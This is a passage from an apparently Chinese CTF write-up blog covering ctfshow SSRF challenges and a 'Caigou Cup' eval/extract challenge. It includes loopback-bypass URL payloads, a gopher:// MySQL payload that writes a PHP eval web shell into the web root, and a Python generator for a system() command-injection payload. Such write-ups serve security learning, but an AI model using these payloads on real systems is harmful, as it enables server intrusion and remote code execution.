class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\„ÄÇ/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/function.parse-url.php"><strong>parse_url</strong> </a></p><blockquote><p>parse_url ‚Äî Ëß£Êûê URLÔºåËøîÂõûÂÖ∂ÁªÑÊàêÈÉ®ÂàÜ</p></blockquote><blockquote><p>curl_setopt ‚Äî ËÆæÁΩÆ‰∏Ä‰∏™cURL‰º†ËæìÈÄâÈ°π</p><p>ch</p><p>Áî± curl_init() ËøîÂõûÁöÑ cURL Âè•ÊüÑ„ÄÇ</p><p>option</p><p>ÈúÄË¶ÅËÆæÁΩÆÁöÑCURLOPT_XXXÈÄâÈ°π„ÄÇ</p><p>value</p><p>Â∞ÜËÆæÁΩÆÂú®optionÈÄâÈ°π‰∏äÁöÑÂÄº„ÄÇ</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//ÂàùÂßãÂåñ‰∏Ä‰∏™cURL‰ºöËØù</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÂÆöËØ∑Ê±ÇÁöÑRUL</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËÆæÂÆöËøîÂõû‰ø°ÊÅØ‰∏≠ÂåÖÂê´ÂìçÂ∫î‰ø°ÊÅØÂ§¥</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ÂêØÁî®Êó∂‰ºöÂ∞ÜÂ§¥Êñá‰ª∂ÁöÑ‰ø°ÊÅØ‰Ωú‰∏∫Êï∞ÊçÆÊµÅËæìÂá∫„ÄÇ </span><span class="token comment">//ÂèÇÊï∞‰∏∫1Ë°®Á§∫ËæìÂá∫‰ø°ÊÅØÂ§¥,‰∏∫0Ë°®Á§∫‰∏çËæìÂá∫</span><span class="token comment">//ËÆæÂÆöcurl_exec()ÂáΩÊï∞Â∞ÜÂìçÂ∫îÁªìÊûúËøîÂõûÔºåËÄå‰∏çÊòØÁõ¥Êé•ËæìÂá∫</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//TRUE Â∞Ücurl_exec()Ëé∑ÂèñÁöÑ‰ø°ÊÅØ‰ª•Â≠óÁ¨¶‰∏≤ËøîÂõûÔºåËÄå‰∏çÊòØÁõ¥Êé•ËæìÂá∫„ÄÇ </span><span class="token comment">//ÂèÇÊï∞‰∏∫1Ë°®Á§∫$html,‰∏∫0Ë°®Á§∫echo $html</span><span class="token comment">//ÊâßË°å‰∏Ä‰∏™cURL‰ºöËØù</span><span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÂÖ≥Èó≠‰∏Ä‰∏™surl‰ºöËØù</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ËæìÂá∫ËøîÂõû‰ø°ÊÅØ  Â¶ÇÊûúCURLOPT_RETURNTRANSFERÂèÇÊï∞‰∏∫fasleÂèØÁúÅÁï•</span><span class="token comment">//echo $html;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>127.1‰ºöË¢´Ëß£ÊûêÊàê127.0.0.1Ôºå‰πüÂ∞±ÊÑèÂë≥ÁùÄ‰∏∫Èõ∂ÂèØÁº∫ÁúÅÂú®Linux‰∏≠Ôºå0‰πü‰ºöË¢´Ëß£ÊûêÊàê127.0.0.1127.0.0.0/8ÊòØ‰∏Ä‰∏™ÁéØÂõûÂú∞ÂùÄÁΩëÊÆµÔºå‰ªé127.0.0.1 ~ 127.255.255.254ÈÉΩË°®Á§∫localhostipÂú∞ÂùÄËøòÂèØ‰ª•ÈÄöËøáË°®Á§∫ÊàêÂÖ∂‰ªñËøõÂà∂ÁöÑÂΩ¢ÂºèËÆøÈóÆÔºåIPÂú∞ÂùÄ‰∫åËøõÂà∂„ÄÅÂçÅËøõÂà∂„ÄÅÂçÅÂÖ≠ËøõÂà∂‰∫íÊç¢</code></pre><p><img src="https://img-blog.csdnimg.cn/168e616aefc948da8c4c5279035d9f78.png" alt="1"></p><blockquote><p>ÂçÅËøõÂà∂Êï¥Êï∞Ôºöurl&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>ÂçÅÂÖ≠ËøõÂà∂Ôºöurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>ÂÖ´ËøõÂà∂Ôºöurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>ÂçÅÂÖ≠ËøõÂà∂Êï¥Êï∞Ôºöurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> Áº∫ÁúÅÊ®°ÂºèÔºö127.0.0.1ÂÜôÊàê127.1<br>CIDRÔºöurl&#x3D;<a href="http://127.127.127.127/flag.php%E5%92%8C">http://127.127.127.127/flag.phpÂíå</a> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p></blockquote><h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>‰ΩøÁî®<strong><a href="http://sudo.cc/">http://sudo.cc</a></strong>Ëøô‰∏™ÂüüÂêçÊòØÊåáÂêë127.0.0.1ÁöÑ„ÄÇ<br>payloadÔºö<code>url=http://sudo.cc/flag.php</code></p><h2 id="355"><a href="#355" class="headerlink" title="355"></a>355</h2><p>payload:<code>url=http://0/flag.php</code></p><h2 id="356"><a href="#356" class="headerlink" title="356"></a>356</h2><p>payload:<code>url=http://0/flag.php</code></p><h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>gethostbyname ÂáΩÊï∞‰ªé‰∏ªÊú∫Êï∞ÊçÆÂ∫ì‰∏≠Ê£ÄÁ¥¢‰∏é‰∏ªÊú∫ÂêçÂØπÂ∫îÁöÑ‰∏ªÊú∫‰ø°ÊÅØ„ÄÇ</p></blockquote><blockquote><p>filter_var() ÂáΩÊï∞ÈÄöËøáÊåáÂÆöÁöÑËøáÊª§Âô®ËøáÊª§ÂèòÈáè„ÄÇ<br>Â¶ÇÊûúÊàêÂäüÔºåÂàôËøîÂõûÂ∑≤ËøáÊª§ÁöÑÊï∞ÊçÆÔºåÂ¶ÇÊûúÂ§±Ë¥•ÔºåÂàôËøîÂõû false„ÄÇ</p></blockquote><blockquote><p>FILTER_FLAG_NO_PRIV_RANGE - Ë¶ÅÊ±ÇÂÄºÊòØ RFC ÊåáÂÆöÁöÑÁßÅÂüü IP ÔºàÊØîÂ¶Ç 192.168.0.1Ôºâ<br>FILTER_FLAG_NO_RES_RANGE - Ë¶ÅÊ±ÇÂÄº‰∏çÂú®‰øùÁïôÁöÑ IP ËåÉÂõ¥ÂÜÖ„ÄÇËØ•Ê†áÂøóÊé•Âèó IPV4 Âíå IPV6 ÂÄº„ÄÇ</p></blockquote><p><strong>RFC1918ÊåáÂÆöÁöÑÁßÅÊúâÂú∞ÂùÄÊúâÂì™‰∫õ?</strong></p><blockquote><p>AÁ±ªÔºö10.0.0.0&#x2F;8Âç≥10.0.0.0<del>10.255.255.255<br>BÁ±ªÔºö172.16.0.0&#x2F;12Âç≥172.16.0.0</del>172.31.255.255<br>CÁ±ªÔºö192.168.0.0&#x2F;16Âç≥192.168.0.0~192.168.255.255</p></blockquote><h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ê≠£ÂàôË°®ËææÂºèË°®Êòél‰ª•ctf.ÂºÄÂßã‰ª•showÁªìÊùüÔºå‰∏≠Èó¥‰ªªÊÑè</p><pre><code>ÂΩìparse_url()Ëß£ÊûêÂà∞ÈÇÆÁÆ±Êó∂Ôºö@ÂâçÈù¢ÊòØuserfile_get_contents()‰ºöËÆøÈóÆhost:port/pathÔºå‰∏éuserÊó†ÂÖ≥</code></pre><p><img src="https://img-blog.csdnimg.cn/95d0f8a3ff4c4339b93d58388abd9559.png" alt="1"></p><h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p><strong>ÊâìÊó†ÂØÜÁ†ÅÁöÑmysql</strong><br>ÁÇπÂáªÁôªÈôÜÂêéËøõÂÖ•check.phpÊñá‰ª∂„ÄÇÂï•‰πüÊ≤°ÊúâÔºåËøîÂõû‰∏ªÈ°µÊü•ÁúãÊ∫êÁ†Å„ÄÇ<br><img src="https://img-blog.csdnimg.cn/cb3f6d8d75444bd588df83cb2cc1fa85.png" alt="1">ÂèëÁé∞‰∫ÜËøô‰∏™ÔºåÁúãÊù•‰∏Ä‰∫õwpÔºåÊòØË¶ÅÁî®gopherÂçèËÆÆÊâìMYSQL,,ËøôÈáåÁî®Âà∞Ëøô‰∏™Â∑•ÂÖ∑<a href="https://github.com/tarunkant/Gopherus">gopherus</a>„ÄÇ</p><p><img src="https://img-blog.csdnimg.cn/95522062ea2144718161ffab303b9848.png" alt="2"><br>ÊÑèÊÄùÂ∞±ÊòØËæìÂÖ•MySQLÁöÑÁî®Êà∑ÂêçÔºåÂÜçÁªôÂá∫Ë¶ÅËøêË°åÁöÑËØ≠Âè•„ÄÇ<br><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></p><blockquote><p>ËøôÊòØ‰∏Ä‰∏™MySQLÊü•ËØ¢ËØ≠Âè•ÔºåÂÆÉ‰ºöÂ∞Ü‰∏Ä‰∏™PHP‰ª£Á†ÅÁâáÊÆµÂÜôÂÖ•Âà∞ÁõÆÂΩï‚Äù&#x2F;var&#x2F;www&#x2F;html&#x2F;‚Äú‰∏ãÁöÑÊñá‰ª∂‚Äù2.php‚Äù‰∏≠„ÄÇ<br>ÊâÄÂÜôÂÖ•ÁöÑPHP‰ª£Á†ÅÊòØ‚Äù<?php @eval($_POST['cmd']);?>‚Äú„ÄÇËøôÊÆµ‰ª£Á†Å‰ºöÂàõÂª∫‰∏Ä‰∏™PHPËÑöÊú¨ÔºåËØ•ËÑöÊú¨Êé•Âèó‰∏Ä‰∏™Âêç‰∏∫‚Äùcmd‚ÄùÁöÑPOSTËØ∑Ê±ÇÂèÇÊï∞ÔºåÁÑ∂ÂêéÂ∞Ü‚Äùcmd‚ÄùÂèÇÊï∞ÁöÑÂÜÖÂÆπ‰Ωú‰∏∫PHP‰ª£Á†ÅÊâßË°å„ÄÇ<br>ËøôÊÆµ‰ª£Á†ÅÂèØËÉΩË¢´ÊîªÂáªËÄÖÁî®Êù•Âú®WebÊúçÂä°Âô®‰∏äÂàõÂª∫‰∏Ä‰∏™ÂêéÈó®Ôºå‰ΩøÂæóÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂèëÈÄÅÁâπÂà∂ÁöÑPOSTËØ∑Ê±ÇÊù•ÊâßË°å‰ªªÊÑèÂëΩ‰ª§„ÄÇ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/0b40b99caeea4464bd7f897232c326cf.png" alt="3"><br>**_**ÂêéÈù¢ÁöÑurlÂÜçËøõË°å‰∏ÄÊ¨°urlÁºñÁ†Å„ÄÇ<br>ÁÑ∂ÂêéËøõÂÖ•check.phpÊñá‰ª∂post<br><code>returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</code><br>ËøôÊó∂2.phpÊñá‰ª∂Â∑≤ÁªèÊàêÂäüÂÜôÂÖ•ÔºåËÆøÈóÆ2.phpÊñá‰ª∂ËøõË°åÂëΩ‰ª§ÊâßË°åÂæóÂà∞flag„ÄÇ</p><h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p><strong>Êâìredis</strong><br>redisÁöÑÁ´ØÂè£ÊòØ<strong>6379</strong><br>ÊâìredisÂç≥ÂèØ</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow ËèúÁãóÊùØ</title>
      <link href="/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/"/>
      <url>/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÊàëÁöÑÁúºÈáåÂè™Êúâ"><a href="#ÊàëÁöÑÁúºÈáåÂè™Êúâ" class="headerlink" title="ÊàëÁöÑÁúºÈáåÂè™Êúâ$"></a>ÊàëÁöÑÁúºÈáåÂè™Êúâ$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2022-11-10 17:20:38# @Last Modified by:   h1xa# @Last Modified time: 2022-11-11 08:21:54# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÅáÂ¶Ç‰º†ÂÖ•_&#x3D;aÔºåÈÇ£‰πàÂ∞±ÊòØ$<em>&#x3D;a;ÂÜç‰º†ÂÖ•a&#x3D;bÔºåÈÇ£Â∞±ÊòØ$$</em>&#x3D;bÔºõ</p><h3 id="extract-ÂÆö‰πâÂíåÁî®Ê≥ï"><a href="#extract-ÂÆö‰πâÂíåÁî®Ê≥ï" class="headerlink" title="extract()ÂÆö‰πâÂíåÁî®Ê≥ï"></a>extract()ÂÆö‰πâÂíåÁî®Ê≥ï</h3><p>extract() ÂáΩÊï∞‰ªéÊï∞ÁªÑ‰∏≠Â∞ÜÂèòÈáèÂØºÂÖ•Âà∞ÂΩìÂâçÁöÑÁ¨¶Âè∑Ë°®„ÄÇ</p><p>ËØ•ÂáΩÊï∞‰ΩøÁî®Êï∞ÁªÑÈîÆÂêç‰Ωú‰∏∫ÂèòÈáèÂêçÔºå‰ΩøÁî®Êï∞ÁªÑÈîÆÂÄº‰Ωú‰∏∫ÂèòÈáèÂÄº„ÄÇÈíàÂØπÊï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏™ÂÖÉÁ¥†ÔºåÂ∞ÜÂú®ÂΩìÂâçÁ¨¶Âè∑Ë°®‰∏≠ÂàõÂª∫ÂØπÂ∫îÁöÑ‰∏Ä‰∏™ÂèòÈáè„ÄÇ</p><p>Á¨¨‰∫å‰∏™ÂèÇÊï∞ type Áî®‰∫éÊåáÂÆöÂΩìÊüê‰∏™ÂèòÈáèÂ∑≤ÁªèÂ≠òÂú®ÔºåËÄåÊï∞ÁªÑ‰∏≠ÂèàÊúâÂêåÂêçÂÖÉÁ¥†Êó∂Ôºåextract() ÂáΩÊï∞Â¶Ç‰ΩïÂØπÂæÖËøôÊ†∑ÁöÑÂÜ≤Á™Å„ÄÇ</p><p>ËØ•ÂáΩÊï∞ËøîÂõûÊàêÂäüÂØºÂÖ•Âà∞Á¨¶Âè∑Ë°®‰∏≠ÁöÑÂèòÈáèÊï∞ÁõÆ„ÄÇ</p><p>ÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÂ•óÂ®É‰º†ÂÖ•ÂèòÈáèÔºåÂ∫îËØ•‰º†ÂÖ•36‰∏™ÂèòÈáèÂÜçÊâßË°åÂëΩ‰ª§„ÄÇ<br>ËÑöÊú¨Ôºö</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> strings<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letterst<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#Ë¶ÅÊâßË°åÁöÑÂëΩ‰ª§</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(‚Äòls‚Äô);</p></blockquote><p>ÂÜçÂØªÊâæflag<br>ÂéüÊù•Âú®**cd ..&#x2F;..&#x2F;..&#x2F;**‰∏ã<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p><h2 id="ÊäΩËÄÅÂ©Ü"><a href="#ÊäΩËÄÅÂ©Ü" class="headerlink" title="ÊäΩËÄÅÂ©Ü"></a>ÊäΩËÄÅÂ©Ü</h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong>Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ</strong></p><p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br>ËÆøÈóÆ<strong><a href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong>Êó∂ÂèëÁé∞Êå®<strong>app.py</strong>Â≠òÂú®<a 